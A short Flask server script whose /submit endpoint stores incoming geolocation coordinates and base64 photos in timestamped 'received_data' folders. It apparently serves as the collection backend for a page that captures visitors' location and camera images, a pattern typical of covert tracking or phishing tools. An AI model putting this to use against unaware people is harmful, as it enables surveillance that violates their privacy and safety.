from flask import Flask, render_template, request, jsonify
import os, json, base64, datetime

app = Flask(__name__)
os.makedirs('received_data', exist_ok=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    folder = os.path.join('received_data', ts)
    os.makedirs(folder, exist_ok=True)

    loc = data.get('location', {})
    with open(os.path.join(folder, 'location.txt'), 'w') as f:
        f.write(f"Lat: {loc.get('lat')}\nLon: {loc.get('lon')}")

    for i, photo in enumerate(data.get('photos', [])):
        img_data = base64.b64decode(photo.split(',')[1])
        with open(os.path.join(folder, f'photo_{i}.jpg'), 'wb') as f:
            f.write(img_data)

    return jsonify({'status': 'ok'})
if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)